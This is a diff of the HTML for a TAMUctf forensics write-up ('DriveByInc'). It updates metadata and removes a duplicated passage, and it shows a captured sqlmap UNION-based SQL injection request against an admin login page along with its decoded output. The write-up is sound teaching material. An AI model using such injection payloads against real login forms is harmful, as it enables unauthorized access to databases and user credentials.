@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://i.imgur.com/VQiWZwY.png">
 <meta property="og:image" content="https://i.imgur.com/jwlvSLI.png">
 <meta property="og:image" content="https://i.imgur.com/3cwyVVK.png">
-<meta property="og:updated_time" content="2019-03-04T02:33:44.813Z">
+<meta property="og:updated_time" content="2019-03-04T02:35:18.217Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Forensics] TAMUctf - DriveByInc">
 <meta name="twitter:description" content="0_intrusion0_intrusion100Welcome to Drive By Inc. We provide all sorts of logistical solutions for our customers.Over the past few years we moved to hosting a large portion of our business on a nice l">
@@ -378,7 +378,7 @@
         
 		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 3,350 (words)</span>
+		<span class="post-wordcount hidden-xs">Word Count: 3,287 (words)</span>
 	
 	
 		<span class="post-readcount hidden-xs">Read Time: 21 (min)</span>
@@ -432,9 +432,6 @@
 <p>Sqlmap uses this strings to easily parse content that’s why the output of the request comes very weird like this:</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>You logged in as qkzbqSqliDBqqbxq<span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>Just remove both qkzbq and qqbxq and you get SqliDB which is the database name. Now we don’t really care about the database names and table names so we can skip the next requests and look to when they started dumping the usernames and passwords.</p>
-<p>Request to get the users count number:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /adminlogin.php?username=adsf' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="keyword">CONCAT</span>(<span class="number">0x716b7a6271</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x7171627871</span>),<span class="literal">NULL</span> <span class="keyword">FROM</span> SqliDB.Users<span class="comment">-- qKQB&amp;password=adsf HTTP/1.1\r\n</span></span><br></pre></td></tr></table></figure></p>
-<p>Output of the users number:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;You logged in as qkzbq5qqbxq&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p>Removing the parse strings:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;You logged in as 5&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
 <p>Request to get the users count number:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /adminlogin.php?username=adsf' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="keyword">CONCAT</span>(<span class="number">0x716b7a6271</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x7171627871</span>),<span class="literal">NULL</span> <span class="keyword">FROM</span> SqliDB.Users<span class="comment">-- qKQB&amp;password=adsf HTTP/1.1\r\n</span></span><br></pre></td></tr></table></figure></p>
 <p>Output of the users number:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;You logged in as qkzbq5qqbxq&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
 <p>Removing the parse strings:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;You logged in as 5&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
